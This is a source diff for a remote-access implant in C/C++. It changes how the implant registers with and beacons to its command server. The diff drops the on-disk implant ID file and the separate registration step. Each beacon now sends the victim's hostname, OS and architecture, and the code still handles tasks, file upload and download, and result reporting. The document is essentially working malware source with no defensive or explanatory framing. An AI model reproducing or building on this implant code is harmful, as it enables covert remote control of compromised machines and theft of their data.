@@ -19,9 +19,6 @@
     #include <windows.h>
     #include <security.h>
     #include <schannel.h>
-    #ifndef file_path
-    #define file_path "\\windows\\Temp\\id"  //"z:\\tmp\\id"    
-    #endif
     #define SLEEP(seconds) Sleep((seconds) * 1000) 
 #else
     //#include <cjson/cJSON.h>
@@ -34,9 +31,6 @@
     #include <arpa/inet.h>
     #include <netdb.h>
     #include <sys/socket.h>
-    #ifndef file_path
-    #define file_path "/tmp/id"
-    #endif
     #define SLEEP(seconds) sleep(seconds)
 #endif
 
@@ -96,7 +90,6 @@ class Communicate {
     int SEND(const char *buffer, int buffer_len);
     int upload_to_server(const char* path);
     int download_from_server(const char* path);
-    int register_implant();
     int beacon_implant();
 };
 
@@ -112,16 +105,9 @@ int main() {
 
     Communicate com;
     
-
     while (1) {
-        FILE *fp = fopen(file_path, "r");
-        if (!fp) {
-            if (com.register_implant() != 0) {
-                SLEEP(jitter());
-                 continue;
-            }
-        }
         com.beacon_implant();
+        jitter();
     }
     return 0;
 }
@@ -402,8 +388,13 @@ int Communicate::RECV(char *buffer, int buffer_len) {
 #endif
 
 
+int Communicate::beacon_implant() {
+    
+    cJSON *beacon = cJSON_CreateObject();
+    if (!beacon) {
+        return -1;
+    }
 
-int Communicate::register_implant() {
     GetDeviceInfo device;
     char hostname[BUFFER_SIZE];
     char os[BUFFER_SIZE];
@@ -418,63 +409,11 @@ int Communicate::register_implant() {
     cJSON *reg = cJSON_CreateObject();
     if (!reg) return -1;
 
-    cJSON_AddStringToObject(reg, "mode", "register");
-    cJSON_AddStringToObject(reg, "os", os);
-    cJSON_AddStringToObject(reg, "hostname", hostname);
-    cJSON_AddStringToObject(reg, "arch", arch);
-    char *data = cJSON_Print(reg);
-
-    if (SEND(data, strlen(data)) ==  -1) {
-        return -1;
-    }
-
-    free(data);
-    cJSON_Delete(reg);
-
-    char buffer[BUFFER_SIZE];
-    if (RECV(buffer, sizeof(buffer)) == -1) {
-        // handle this
-        return -1;
-    }
-
-    cJSON *reply = cJSON_Parse(buffer);
-    if (!reply) return -1;
-
-    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");
-
-    FILE *f = fopen(file_path, "w");
-    if (!f) {
-        return -1;
-    }
-
-    fprintf(f, "%s", id->valuestring);
-    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
-    fclose(f);
-    cJSON_Delete(reply);
-    return 0;
-}
+    cJSON_AddStringToObject(beacon, "os", os);
+    cJSON_AddStringToObject(beacon, "hostname", hostname);
+    cJSON_AddStringToObject(beacon, "arch", arch);
 
 
-int Communicate::beacon_implant() {
-    
-    cJSON *beacon = cJSON_CreateObject();
-    if (!beacon) {
-        return -1;
-    }
-
-    FILE *fp = fopen(file_path, "r");
-    if (!fp) return -1;
-    char id[9];
-    if (fgets(id, sizeof(id), fp) != NULL) {
-        id[strcspn(id, "\r\n")] = '\0';
-    } else {
-        return -1;
-    }
-
-    fclose(fp);
-    
-    cJSON_AddStringToObject(beacon, "mode", "beacon");
-    cJSON_AddStringToObject(beacon, "implant_id", id);
     char *data = cJSON_Print(beacon);
     if (SEND(data, strlen(data)) == -1) {
         cJSON_Delete(beacon);
@@ -555,7 +494,7 @@ int Communicate::beacon_implant() {
     }
     SEND_RESULT:
     cJSON_AddStringToObject(reply, "mode", "result");
-    cJSON_AddStringToObject(reply, "implant_id", id);
+    //cJSON_AddStringToObject(reply, "implant_id", id);
     cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
     cJSON_AddStringToObject(reply, "response", result);
     char *result_ = cJSON_Print(reply);
